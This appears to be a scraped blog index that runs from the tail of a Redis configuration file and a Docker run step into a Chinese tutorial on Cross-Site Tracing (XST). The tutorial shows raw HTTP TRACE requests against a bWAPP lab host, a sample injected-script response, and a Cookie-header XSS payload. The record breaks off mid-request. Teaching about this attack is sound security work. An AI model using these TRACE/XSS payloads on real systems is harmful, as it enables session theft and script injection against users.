reclaim memory in background. Those commands# are executed in constant time. Another thread will incrementally free the# object in the background as fast as possible.## DEL, UNLINK and ASYNC option of FLUSHALL and FLUSHDB are user-controlled.# It&#x27;s up to the design of the application to understand when it is a good# idea to use one or the other. However the Redis server sometimes has to# delete keys or flush the whole database as a side effect of other operations.# Specifically Redis deletes objects independently of a user call in the# following scenarios:## 1) On eviction, because of the maxmemory and maxmemory policy configurations,#    in order to make room for new data, without going over the specified#    memory limit.# 2) Because of expire: when a key with an associated time to live (see the#    EXPIRE command) must be deleted from memory.# 3) Because of a side effect of a command that stores data on a key that may#    already exist. For example the RENAME command may delete the old key#    content when it is replaced with another one. Similarly SUNIONSTORE#    or SORT with STORE option may delete existing keys. The SET command#    itself removes any old content of the specified key in order to replace#    it with the specified string.# 4) During replication, when a replica performs a full resynchronization with#    its master, the content of the whole database is removed in order to#    load the RDB file just transferred.## In all the above cases the default is to delete objects in a blocking way,# like if DEL was called. However you can configure each case specifically# in order to instead release memory in a non-blocking way like if UNLINK# was called, using the following configuration directives: lazyfree-lazy-eviction nolazyfree-lazy-expire nolazyfree-lazy-server-del noreplica-lazy-flush no ############################## APPEND ONLY MODE ############################### # By default Redis asynchronously dumps the dataset on disk. This mode is# good enough in many applications, but an issue with the Redis process or# a power outage may result into a few minutes of writes lost (depending on# the configured save points).## The Append Only File is an alternative persistence mode that provides# much better durability. For instance using the default data fsync policy# (see later in the config file) Redis can lose just one second of writes in a# dramatic event like a server power outage, or a single write if something# wrong with the Redis process itself happens, but the operating system is# still running correctly.## AOF and RDB persistence can be enabled at the same time without problems.# If the AOF is enabled on startup Redis will load the AOF, that is the file# with the better durability guarantees.## Please check http://redis.io/topics/persistence for more information. appendonly no # The name of the append only file (default: &quot;appendonly.aof&quot;) appendfilename &quot;appendonly.aof&quot; # The fsync() call tells the Operating System to actually write data on disk# instead of waiting for more data in the output buffer. Some OS will really flush# data on disk, some other OS will just try to do it ASAP.## Redis supports three different modes:## no: don&#x27;t fsync, just let the OS flush the data when it wants. Faster.# always: fsync after every write to the append only log. Slow, Safest.# everysec: fsync only one time every second. Compromise.## The default is &quot;everysec&quot;, as that&#x27;s usually the right compromise between# speed and data safety. It&#x27;s up to you to understand if you can relax this to# &quot;no&quot; that will let the operating system flush the output buffer when# it wants, for better performances (but if you can live with the idea of# some data loss consider the default persistence mode that&#x27;s snapshotting),# or on the contrary, use &quot;always&quot; that&#x27;s very slow but a bit safer than# everysec.## More details please check the following article:# http://antirez.com/post/redis-persistence-demystified.html## If unsure, use &quot;everysec&quot;. # appendfsync alwaysappendfsync everysec# appendfsync no # When the AOF fsync policy is set to always or everysec, and a background# saving process (a background save or AOF log background rewriting) is# performing a lot of I/O against the disk, in some Linux configurations# Redis may block too long on the fsync() call. Note that there is no fix for# this currently, as even performing fsync in a different thread will block# our synchronous write(2) call.## In order to mitigate this problem it&#x27;s possible to use the following option# that will prevent fsync() from being called in the main process while a# BGSAVE or BGREWRITEAOF is in progress.## This means that while another child is saving, the durability of Redis is# the same as &quot;appendfsync none&quot;. In practical terms, this means that it is# possible to lose up to 30 seconds of log in the worst scenario (with the# default Linux settings).## If you have latency problems turn this to &quot;yes&quot;. Otherwise leave it as# &quot;no&quot; that is the safest pick from the point of view of durability. no-appendfsync-on-rewrite no # Automatic rewrite of the append only file.# Redis is able to automatically rewrite the log file implicitly calling# BGREWRITEAOF when the AOF log size grows by the specified percentage.## This is how it works: Redis remembers the size of the AOF file after the# latest rewrite (if no rewrite has happened since the restart, the size of# the AOF at startup is used).## This base size is compared to the current size. If the current size is# bigger than the specified percentage, the rewrite is triggered. Also# you need to specify a minimal size for the AOF file to be rewritten, this# is useful to avoid rewriting the AOF file even if the percentage increase# is reached but it is still pretty small.## Specify a percentage of zero in order to disable the automatic AOF# rewrite feature. auto-aof-rewrite-percentage 100auto-aof-rewrite-min-size 64mb # An AOF file may be found to be truncated at the end during the Redis# startup process, when the AOF data gets loaded back into memory.# This may happen when the system where Redis is running# crashes, especially when an ext4 filesystem is mounted without the# data=ordered option (however this can&#x27;t happen when Redis itself# crashes or aborts but the operating system still works correctly).## Redis can either exit with an error when this happens, or load as much# data as possible (the default now) and start if the AOF file is found# to be truncated at the end. The following option controls this behavior.## If aof-load-truncated is set to yes, a truncated AOF file is loaded and# the Redis server starts emitting a log to inform the user of the event.# Otherwise if the option is set to no, the server aborts with an error# and refuses to start. When the option is set to no, the user requires# to fix the AOF file using the &quot;redis-check-aof&quot; utility before to restart# the server.## Note that if the AOF file will be found to be corrupted in the middle# the server will still exit with an error. This option only applies when# Redis will try to read more data from the AOF file but not enough bytes# will be found.aof-load-truncated yes # When rewriting the AOF file, Redis is able to use an RDB preamble in the# AOF file for faster rewrites and recoveries. When this option is turned# on the rewritten AOF file is composed of two different stanzas:##   [RDB file][AOF tail]## When loading Redis recognizes that the AOF file starts with the &quot;REDIS&quot;# string and loads the prefixed RDB file, and continues loading the AOF# tail.aof-use-rdb-preamble yes ################################ LUA SCRIPTING  ############################### # Max execution time of a Lua script in milliseconds.## If the maximum execution time is reached Redis will log that a script is# still in execution after the maximum allowed time and will start to# reply to queries with an error.## When a long running script exceeds the maximum execution time only the# SCRIPT KILL and SHUTDOWN NOSAVE commands are available. The first can be# used to stop a script that did not yet called write commands. The second# is the only way to shut down the server in the case a write command was# already issued by the script but the user doesn&#x27;t want to wait for the natural# termination of the script.## Set it to 0 or a negative value for unlimited execution without warnings.lua-time-limit 5000 ################################ REDIS CLUSTER  ############################### # Normal Redis instances can&#x27;t be part of a Redis Cluster; only nodes that are# started as cluster nodes can. In order to start a Redis instance as a# cluster node enable the cluster support uncommenting the following:## cluster-enabled yes # Every cluster node has a cluster configuration file. This file is not# intended to be edited by hand. It is created and updated by Redis nodes.# Every Redis Cluster node requires a different cluster configuration file.# Make sure that instances running in the same system do not have# overlapping cluster configuration file names.## cluster-config-file nodes-6379.conf # Cluster node timeout is the amount of milliseconds a node must be unreachable# for it to be considered in failure state.# Most other internal time limits are multiple of the node timeout.## cluster-node-timeout 15000 # A replica of a failing master will avoid to start a failover if its data# looks too old.## There is no simple way for a replica to actually have an exact measure of# its &quot;data age&quot;, so the following two checks are performed:## 1) If there are multiple replicas able to failover, they exchange messages#    in order to try to give an advantage to the replica with the best#    replication offset (more data from the master processed).#    Replicas will try to get their rank by offset, and apply to the start#    of the failover a delay proportional to their rank.## 2) Every single replica computes the time of the last interaction with#    its master. This can be the last ping or command received (if the master#    is still in the &quot;connected&quot; state), or the time that elapsed since the#    disconnection with the master (if the replication link is currently down).#    If the last interaction is too old, the replica will not try to failover#    at all.## The point &quot;2&quot; can be tuned by user. Specifically a replica will not perform# the failover if, since the last interaction with the master, the time# elapsed is greater than:##   (node-timeout * replica-validity-factor) + repl-ping-replica-period## So for example if node-timeout is 30 seconds, and the replica-validity-factor# is 10, and assuming a default repl-ping-replica-period of 10 seconds, the# replica will not try to failover if it was not able to talk with the master# for longer than 310 seconds.## A large replica-validity-factor may allow replicas with too old data to failover# a master, while a too small value may prevent the cluster from being able to# elect a replica at all.## For maximum availability, it is possible to set the replica-validity-factor# to a value of 0, which means, that replicas will always try to failover the# master regardless of the last time they interacted with the master.# (However they&#x27;ll always try to apply a delay proportional to their# offset rank).## Zero is the only value able to guarantee that when all the partitions heal# the cluster will always be able to continue.## cluster-replica-validity-factor 10 # Cluster replicas are able to migrate to orphaned masters, that are masters# that are left without working replicas. This improves the cluster ability# to resist to failures as otherwise an orphaned master can&#x27;t be failed over# in case of failure if it has no working replicas.## Replicas migrate to orphaned masters only if there are still at least a# given number of other working replicas for their old master. This number# is the &quot;migration barrier&quot;. A migration barrier of 1 means that a replica# will migrate only if there is at least 1 other working replica for its master# and so forth. It usually reflects the number of replicas you want for every# master in your cluster.## Default is 1 (replicas migrate only if their masters remain with at least# one replica). To disable migration just set it to a very large value.# A value of 0 can be set but is useful only for debugging and dangerous# in production.## cluster-migration-barrier 1 # By default Redis Cluster nodes stop accepting queries if they detect there# is at least an hash slot uncovered (no available node is serving it).# This way if the cluster is partially down (for example a range of hash slots# are no longer covered) all the cluster becomes, eventually, unavailable.# It automatically returns available as soon as all the slots are covered again.## However sometimes you want the subset of the cluster which is working,# to continue to accept queries for the part of the key space that is still# covered. In order to do so, just set the cluster-require-full-coverage# option to no.## cluster-require-full-coverage yes # This option, when set to yes, prevents replicas from trying to failover its# master during master failures. However the master can still perform a# manual failover, if forced to do so.## This is useful in different scenarios, especially in the case of multiple# data center operations, where we want one side to never be promoted if not# in the case of a total DC failure.## cluster-replica-no-failover no # In order to setup your cluster make sure to read the documentation# available at http://redis.io web site. ########################## CLUSTER DOCKER/NAT support  ######################## # In certain deployments, Redis Cluster nodes address discovery fails, because# addresses are NAT-ted or because ports are forwarded (the typical case is# Docker and other containers).## In order to make Redis Cluster working in such environments, a static# configuration where each node knows its public address is needed. The# following two options are used for this scope, and are:## * cluster-announce-ip# * cluster-announce-port# * cluster-announce-bus-port## Each instruct the node about its address, client port, and cluster message# bus port. The information is then published in the header of the bus packets# so that other nodes will be able to correctly map the address of the node# publishing the information.## If the above options are not used, the normal Redis Cluster auto-detection# will be used instead.## Note that when remapped, the bus port may not be at the fixed offset of# clients port + 10000, so you can specify any port and bus-port depending# on how they get remapped. If the bus-port is not set, a fixed offset of# 10000 will be used as usually.## Example:## cluster-announce-ip 10.1.1.5# cluster-announce-port 6379# cluster-announce-bus-port 6380 ################################## SLOW LOG ################################### # The Redis Slow Log is a system to log queries that exceeded a specified# execution time. The execution time does not include the I/O operations# like talking with the client, sending the reply and so forth,# but just the time needed to actually execute the command (this is the only# stage of command execution where the thread is blocked and can not serve# other requests in the meantime).## You can configure the slow log with two parameters: one tells Redis# what is the execution time, in microseconds, to exceed in order for the# command to get logged, and the other parameter is the length of the# slow log. When a new command is logged the oldest one is removed from the# queue of logged commands. # The following time is expressed in microseconds, so 1000000 is equivalent# to one second. Note that a negative number disables the slow log, while# a value of zero forces the logging of every command.slowlog-log-slower-than 10000 # There is no limit to this length. Just be aware that it will consume memory.# You can reclaim memory used by the slow log with SLOWLOG RESET.slowlog-max-len 128 ################################ LATENCY MONITOR ############################## # The Redis latency monitoring subsystem samples different operations# at runtime in order to collect data related to possible sources of# latency of a Redis instance.## Via the LATENCY command this information is available to the user that can# print graphs and obtain reports.## The system only logs operations that were performed in a time equal or# greater than the amount of milliseconds specified via the# latency-monitor-threshold configuration directive. When its value is set# to zero, the latency monitor is turned off.## By default latency monitoring is disabled since it is mostly not needed# if you don&#x27;t have latency issues, and collecting data has a performance# impact, that while very small, can be measured under big load. Latency# monitoring can easily be enabled at runtime using the command# &quot;CONFIG SET latency-monitor-threshold &lt;milliseconds&gt;&quot; if needed.latency-monitor-threshold 0 ############################# EVENT NOTIFICATION ############################## # Redis can notify Pub/Sub clients about events happening in the key space.# This feature is documented at http://redis.io/topics/notifications## For instance if keyspace events notification is enabled, and a client# performs a DEL operation on key &quot;foo&quot; stored in the Database 0, two# messages will be published via Pub/Sub:## PUBLISH __keyspace@0__:foo del# PUBLISH __keyevent@0__:del foo## It is possible to select the events that Redis will notify among a set# of classes. Every class is identified by a single character:##  K     Keyspace events, published with __keyspace@&lt;db&gt;__ prefix.#  E     Keyevent events, published with __keyevent@&lt;db&gt;__ prefix.#  g     Generic commands (non-type specific) like DEL, EXPIRE, RENAME, ...#  $     String commands#  l     List commands#  s     Set commands#  h     Hash commands#  z     Sorted set commands#  x     Expired events (events generated every time a key expires)#  e     Evicted events (events generated when a key is evicted for maxmemory)#  A     Alias for g$lshzxe, so that the &quot;AKE&quot; string means all the events.##  The &quot;notify-keyspace-events&quot; takes as argument a string that is composed#  of zero or multiple characters. The empty string means that notifications#  are disabled.##  Example: to enable list and generic events, from the point of view of the#           event name, use:##  notify-keyspace-events Elg##  Example 2: to get the stream of the expired keys subscribing to channel#             name __keyevent@0__:expired use:#  notify-keyspace-events Ex##  By default all notifications are disabled because most users don&#x27;t need#  this feature and the feature has some overhead. Note that if you don&#x27;t#  specify at least one of K or E, no events will be delivered.#notify-keyspace-events &quot;&quot; ############################### ADVANCED CONFIG ############################### # Hashes are encoded using a memory efficient data structure when they have a# small number of entries, and the biggest entry does not exceed a given# threshold. These thresholds can be configured using the following directives.hash-max-ziplist-entries 512hash-max-ziplist-value 64 # Lists are also encoded in a special way to save a lot of space.# The number of entries allowed per internal list node can be specified# as a fixed maximum size or a maximum number of elements.# For a fixed maximum size, use -5 through -1, meaning:# -5: max size: 64 Kb  &lt;-- not recommended for normal workloads# -4: max size: 32 Kb  &lt;-- not recommended# -3: max size: 16 Kb  &lt;-- probably not recommended# -2: max size: 8 Kb   &lt;-- good# -1: max size: 4 Kb   &lt;-- good# Positive numbers mean store up to _exactly_ that number of elements# per list node.# The highest performing option is usually -2 (8 Kb size) or -1 (4 Kb size),# but if your use case is unique, adjust the settings as necessary.list-max-ziplist-size -2 # Lists may also be compressed.# Compress depth is the number of quicklist ziplist nodes from *each* side of# the list to *exclude* from compression.  The head and tail of the list# are always uncompressed for fast push/pop operations.  Settings are:# 0: disable all list compression# 1: depth 1 means &quot;don&#x27;t start compressing until after 1 node into the list,#    going from either the head or tail&quot;#    So: [head]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[tail]#    [head], [tail] will always be uncompressed; inner nodes will compress.# 2: [head]-&gt;[next]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[prev]-&gt;[tail]#    2 here means: don&#x27;t compress head or head-&gt;next or tail-&gt;prev or tail,#    but compress all nodes between them.# 3: [head]-&gt;[next]-&gt;[next]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[prev]-&gt;[prev]-&gt;[tail]# etc.list-compress-depth 0 # Sets have a special encoding in just one case: when a set is composed# of just strings that happen to be integers in radix 10 in the range# of 64 bit signed integers.# The following configuration setting sets the limit in the size of the# set in order to use this special memory saving encoding.set-max-intset-entries 512 # Similarly to hashes and lists, sorted sets are also specially encoded in# order to save a lot of space. This encoding is only used when the length and# elements of a sorted set are below the following limits:zset-max-ziplist-entries 128zset-max-ziplist-value 64 # HyperLogLog sparse representation bytes limit. The limit includes the# 16 bytes header. When an HyperLogLog using the sparse representation crosses# this limit, it is converted into the dense representation.## A value greater than 16000 is totally useless, since at that point the# dense representation is more memory efficient.## The suggested value is ~ 3000 in order to have the benefits of# the space efficient encoding without slowing down too much PFADD,# which is O(N) with the sparse encoding. The value can be raised to# ~ 10000 when CPU is not a concern, but space is, and the data set is# composed of many HyperLogLogs with cardinality in the 0 - 15000 range.hll-sparse-max-bytes 3000 # Streams macro node max size / items. The stream data structure is a radix# tree of big nodes that encode multiple items inside. Using this configuration# it is possible to configure how big a single node can be in bytes, and the# maximum number of items it may contain before switching to a new node when# appending new stream entries. If any of the following settings are set to# zero, the limit is ignored, so for instance it is possible to set just a# max entires limit by setting max-bytes to 0 and max-entries to the desired# value.stream-node-max-bytes 4096stream-node-max-entries 100 # Active rehashing uses 1 millisecond every 100 milliseconds of CPU time in# order to help rehashing the main Redis hash table (the one mapping top-level# keys to values). The hash table implementation Redis uses (see dict.c)# performs a lazy rehashing: the more operation you run into a hash table# that is rehashing, the more rehashing &quot;steps&quot; are performed, so if the# server is idle the rehashing is never complete and some more memory is used# by the hash table.## The default is to use this millisecond 10 times every second in order to# actively rehash the main dictionaries, freeing memory when possible.## If unsure:# use &quot;activerehashing no&quot; if you have hard latency requirements and it is# not a good thing in your environment that Redis can reply from time to time# to queries with 2 milliseconds delay.## use &quot;activerehashing yes&quot; if you don&#x27;t have such hard requirements but# want to free memory asap when possible.activerehashing yes # The client output buffer limits can be used to force disconnection of clients# that are not reading data from the server fast enough for some reason (a# common reason is that a Pub/Sub client can&#x27;t consume messages as fast as the# publisher can produce them).## The limit can be set differently for the three different classes of clients:## normal -&gt; normal clients including MONITOR clients# replica  -&gt; replica clients# pubsub -&gt; clients subscribed to at least one pubsub channel or pattern## The syntax of every client-output-buffer-limit directive is the following:## client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;## A client is immediately disconnected once the hard limit is reached, or if# the soft limit is reached and remains reached for the specified number of# seconds (continuously).# So for instance if the hard limit is 32 megabytes and the soft limit is# 16 megabytes / 10 seconds, the client will get disconnected immediately# if the size of the output buffers reach 32 megabytes, but will also get# disconnected if the client reaches 16 megabytes and continuously overcomes# the limit for 10 seconds.## By default normal clients are not limited because they don&#x27;t receive data# without asking (in a push way), but just after a request, so only# asynchronous clients may create a scenario where data is requested faster# than it can read.## Instead there is a default limit for pubsub and replica clients, since# subscribers and replicas receive data in a push fashion.## Both the hard or the soft limit can be disabled by setting them to zero.client-output-buffer-limit normal 0 0 0client-output-buffer-limit replica 256mb 64mb 60client-output-buffer-limit pubsub 32mb 8mb 60 # Client query buffers accumulate new commands. They are limited to a fixed# amount by default in order to avoid that a protocol desynchronization (for# instance due to a bug in the client) will lead to unbound memory usage in# the query buffer. However you can configure it here if you have very special# needs, such us huge multi/exec requests or alike.## client-query-buffer-limit 1gb # In the Redis protocol, bulk requests, that are, elements representing single# strings, are normally limited ot 512 mb. However you can change this limit# here.## proto-max-bulk-len 512mb # Redis calls an internal function to perform many background tasks, like# closing connections of clients in timeout, purging expired keys that are# never requested, and so forth.## Not all tasks are performed with the same frequency, but Redis checks for# tasks to perform according to the specified &quot;hz&quot; value.## By default &quot;hz&quot; is set to 10. Raising the value will use more CPU when# Redis is idle, but at the same time will make Redis more responsive when# there are many keys expiring at the same time, and timeouts may be# handled with more precision.## The range is between 1 and 500, however a value over 100 is usually not# a good idea. Most users should use the default of 10 and raise this up to# 100 only in environments where very low latency is required.hz 10 # Normally it is useful to have an HZ value which is proportional to the# number of clients connected. This is useful in order, for instance, to# avoid too many clients are processed for each background task invocation# in order to avoid latency spikes.## Since the default HZ value by default is conservatively set to 10, Redis# offers, and enables by default, the ability to use an adaptive HZ value# which will temporary raise when there are many connected clients.## When dynamic HZ is enabled, the actual configured HZ will be used as# as a baseline, but multiples of the configured HZ value will be actually# used as needed once more clients are connected. In this way an idle# instance will use very little CPU time while a busy instance will be# more responsive.dynamic-hz yes # When a child rewrites the AOF file, if the following option is enabled# the file will be fsync-ed every 32 MB of data generated. This is useful# in order to commit the file to the disk more incrementally and avoid# big latency spikes.aof-rewrite-incremental-fsync yes # When redis saves RDB file, if the following option is enabled# the file will be fsync-ed every 32 MB of data generated. This is useful# in order to commit the file to the disk more incrementally and avoid# big latency spikes.rdb-save-incremental-fsync yes # Redis LFU eviction (see maxmemory setting) can be tuned. However it is a good# idea to start with the default settings and only change them after investigating# how to improve the performances and how the keys LFU change over time, which# is possible to inspect via the OBJECT FREQ command.## There are two tunable parameters in the Redis LFU implementation: the# counter logarithm factor and the counter decay time. It is important to# understand what the two parameters mean before changing them.## The LFU counter is just 8 bits per key, it&#x27;s maximum value is 255, so Redis# uses a probabilistic increment with logarithmic behavior. Given the value# of the old counter, when a key is accessed, the counter is incremented in# this way:## 1. A random number R between 0 and 1 is extracted.# 2. A probability P is calculated as 1/(old_value*lfu_log_factor+1).# 3. The counter is incremented only if R &lt; P.## The default lfu-log-factor is 10. This is a table of how the frequency# counter changes with a different number of accesses with different# logarithmic factors:## +--------+------------+------------+------------+------------+------------+# | factor | 100 hits   | 1000 hits  | 100K hits  | 1M hits    | 10M hits   |# +--------+------------+------------+------------+------------+------------+# | 0      | 104        | 255        | 255        | 255        | 255        |# +--------+------------+------------+------------+------------+------------+# | 1      | 18         | 49         | 255        | 255        | 255        |# +--------+------------+------------+------------+------------+------------+# | 10     | 10         | 18         | 142        | 255        | 255        |# +--------+------------+------------+------------+------------+------------+# | 100    | 8          | 11         | 49         | 143        | 255        |# +--------+------------+------------+------------+------------+------------+## NOTE: The above table was obtained by running the following commands:##   redis-benchmark -n 1000000 incr foo#   redis-cli object freq foo## NOTE 2: The counter initial value is 5 in order to give new objects a chance# to accumulate hits.## The counter decay time is the time, in minutes, that must elapse in order# for the key counter to be divided by two (or decremented if it has a value# less &lt;= 10).## The default value for the lfu-decay-time is 1. A Special value of 0 means to# decay the counter every time it happens to be scanned.## lfu-log-factor 10# lfu-decay-time 1 ########################### ACTIVE DEFRAGMENTATION ######################### WARNING THIS FEATURE IS EXPERIMENTAL. However it was stress tested# even in production and manually tested by multiple engineers for some# time.## What is active defragmentation?# -------------------------------## Active (online) defragmentation allows a Redis server to compact the# spaces left between small allocations and deallocations of data in memory,# thus allowing to reclaim back memory.## Fragmentation is a natural process that happens with every allocator (but# less so with Jemalloc, fortunately) and certain workloads. Normally a server# restart is needed in order to lower the fragmentation, or at least to flush# away all the data and create it again. However thanks to this feature# implemented by Oran Agra for Redis 4.0 this process can happen at runtime# in an &quot;hot&quot; way, while the server is running.## Basically when the fragmentation is over a certain level (see the# configuration options below) Redis will start to create new copies of the# values in contiguous memory regions by exploiting certain specific Jemalloc# features (in order to understand if an allocation is causing fragmentation# and to allocate it in a better place), and at the same time, will release the# old copies of the data. This process, repeated incrementally for all the keys# will cause the fragmentation to drop back to normal values.## Important things to understand:## 1. This feature is disabled by default, and only works if you compiled Redis#    to use the copy of Jemalloc we ship with the source code of Redis.#    This is the default with Linux builds.## 2. You never need to enable this feature if you don&#x27;t have fragmentation#    issues.## 3. Once you experience fragmentation, you can enable this feature when#    needed with the command &quot;CONFIG SET activedefrag yes&quot;.## The configuration parameters are able to fine tune the behavior of the# defragmentation process. If you are not sure about what they mean it is# a good idea to leave the defaults untouched. # Enabled active defragmentation# activedefrag yes # Minimum amount of fragmentation waste to start active defrag# active-defrag-ignore-bytes 100mb # Minimum percentage of fragmentation to start active defrag# active-defrag-threshold-lower 10 # Maximum percentage of fragmentation at which we use maximum effort# active-defrag-threshold-upper 100 # Minimal effort for defrag in CPU percentage# active-defrag-cycle-min 5 # Maximal effort for defrag in CPU percentage# active-defrag-cycle-max 75 # Maximum number of set/hash/zset/list fields that will be processed from# the main dictionary scan# active-defrag-max-scan-fields 1000  \n\n使用redis6.0.8镜像创建容器(也叫运行镜像)\n\ndocker run  -p 6379:6379 --name myr3 --privileged=true -v /app/redis/redis.conf:/etc/redis/redis.conf -v /app/redis/data:/data -d redis:6.0.8 redis-server /etc/redis/redis.conf\n\n\n测试redis-cli连接上来\n\n\ndocker exec -it 运行着Rediis服务的容器ID redis-cli\n\n请证明docker启动使用了我们自己指定的配置文件\n\n修改前\n\n我们用的配置文件，数据库默认是16个\n修改后\n\n宿主机的修改会同步给docker容器里面的配置。记得重启服务\n\n测试redis-cli连接上来第2次\n\n\n8.5 安装Nginx\n见高级篇Portainer\n","categories":["Docker"],"tags":["基本知识"]},{"title":"浅谈CST攻击","url":"/2023/08/06/%E6%B5%85%E8%B0%88CST%E6%94%BB%E5%87%BB/","content":"全称Cross-Site-Tracing&quot;简称为 CST / XST - 跨站式追踪攻击\n先简述相关概念\n0x01 XSS与httponly\n​\t\t正常情况下，客户端脚本（如JS脚本）是可以通过document.cookie函数获得cookie信息，这样如果有XSS跨站漏洞，cookie很容易被盗取。浏览器有一个安全策略，通过设置cookie的httponly属性，这样客户端脚本就不能通过document.cookie访问该cookie，即使有XSS漏洞，也不能盗取用户cookie。这个时候就可以利用HTTP TRACE方法来获取到用户的cookie信息。\n0x02 什么是httponly\n如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击窃取cookie内容\n如何开启\n\nPHP5.2以上版本已支持HttpOnly参数的设置\n\n同样也支持全局的HttpOnly的设置，在php.ini中设置 session.cookie_httponly = 1将开启全局的Cookie的HttpOnly属性。也可以通过代码来实现&lt;?phpini_set(&quot;session.cookie_httponly&quot;, 1); //或session_set_cookie_params(0, NULL, NULL, NULL, TRUE); ?&gt; \n0x03 什么是TRACE方法\n​\t\tTRACE作用：客户端发起一个请求时，这个请求可能要穿过防火墙、代理、网关或其他一些应用程序。每个中间节点都可能会修改原始的 HTTP 请求。TRACE 方法允许客户端在 最终将请求发送给服务器时，看看它变成了什么样子。\n​\t\tTRACE 请求会在目的服务器端发起一个 环回 诊断。行程最后一站的服务器会弹回一条 TRACE 响应，并在响应主体中携带它收到的原始请求报文。这样客户端就可以查看在所有中间 HTTP 应用程序组成的请求 / 响应链上，原始报文是否，以及如何被毁坏或修改过。\n\n0x04 TRACE工作方法\n下面就来看下允许TRACE方法的服务器，TRACE方法是如何工作的。\n请求包:\nTRACE http://10.20.40.95/bWAPP/bWAPP/xss_get.php?firstname=aaaa&amp;lastname=aaa&amp;form=submit HTTP/1.1Host: 10.20.40.95Connection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Referer: http://10.20.40.95/bWAPP/bWAPP/xss_get.php?firstname=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;lastname=aa&amp;form=submitAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: UM_distinctid=16d6147443356c-0f39aedf637785-67e1b3f-144000-16d61474434806; CNZZDATA1261218610=72836639-1569293821-%7C1569293821; PHPSESSID=jo1tq7ivnljqoknds138igko97; security_level=2\n响应包：\nHTTP/1.1 200 OKDate: Fri, 29 Nov 2019 11:32:59 GMTServer: Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2.3.9Keep-Alive: timeout=5, max=100Connection: Keep-AliveContent-Type: text/htmlContent-Length: 819 TRACE /bWAPP/bWAPP/xss_get.php?firstname=aaaa&amp;lastname=aaa&amp;form=submit HTTP/1.1Host: 10.20.40.95Connection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Referer: http://10.20.40.95/bWAPP/bWAPP/xss_get.php?firstname=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;lastname=aa&amp;form=submitAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: UM_distinctid=16d6147443356c-0f39aedf637785-67e1b3f-144000-16d61474434806; CNZZDATA1261218610=72836639-1569293821-%7C1569293821; PHPSESSID=jo1tq7ivnljqoknds138igko97; security_level=2\n可以看到响应包 响应体中是原始请求报文，并且会下载一个php格式的文件，打开文件内容是原始请求报文。\n\n0x05 漏洞概述\n​\t\t当服务器允许trace方法时，就可能存在跨站跟踪攻击。跨站跟踪攻击即CST攻击，是一种利用XSS和HTTP TRACE功能来进行攻击的方式。\n​\t\t攻击者可以在TRACE请求的响应中插入恶意脚本或者代码。例如，攻击者可以在响应中插入JavaScript代码来执行跨站脚本攻击（XSS攻击），或者在响应中插入重定向代码来将受害者重定向到恶意站点，当受害者浏览网站时，恶意脚本或者代码会被执行。攻击者可以利用恶意脚本或者代码来获取受害者的敏感信息、执行恶意操作等，导致cookie欺骗或者是中间人攻击。\n\n攻击者向受害者发送一条包含TRACE请求的链接或者脚本。TRACE请求通常用于调试和测试Web服务器，可以将HTTP请求和响应回显给客户端。\n当受害者点击链接或者运行脚本时，TRACE请求将被发送到目标Web服务器。由于TRACE请求会将HTTP请求和响应回显给客户端(依旧是响应页面的bp中,我们在http头中插入响应js脚本来攻击)，因此攻击者可以在响应中插入恶意脚本或者代码。\n\nHTTP/1.1 200 OKContent-Type: text/html&lt;html&gt;&lt;head&gt;  &lt;script&gt;    alert(&#x27;你的账号已被攻击&#x27;);    // ... 进行其他恶意操作  &lt;/script&gt;&lt;/head&gt;&lt;body&gt;  正常的响应内容&lt;/body&gt;&lt;/html&gt;\n检测条件：\n\n\n需要目标 Web 服务器允许接受 Trace、Track 方法的请求*\n客户端可以发送 Trace、Track 方法的请求。（如今浏览器环境下已经杜绝这种请求）\n\n\n0x06 漏洞验证\n一、首先通过抓包工具拦截请求，修改请求包中的请求方法和请求包中的任意一个字段，下面以Cookie字段为例，在Cookie中插入XSS代码：\nTRACE http://10.20.40.95/bWAPP/bWAPP/xss_get.php?firstname=aaaa&amp;lastname=aaa&amp;form=submit HTTP/1.1Host: 10.20.40.95Connection: keep-aliveCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: &lt;script&gt;alert(&quot;TRACE XSS&quot;)&lt;/script&gt;\n二、修改响应包中的Content-Type:message/http，改为Content-Type:text/html：\nHTTP/1.1 200 OKDate: Fri, 29 Nov 2019 11:50:49 GMTServer: Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2.3.9Keep-Alive: timeout=5, max=100Connection: Keep-AliveContent-Type: text/htmlContent-Length: 570 TRACE /bWAPP/bWAPP/xss_get.php?firstname=aaaa&amp;lastname=aaa&amp;form=submit HTTP/1.1Host: 10.20.40.95Connection: keep-aliveCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36Accept: 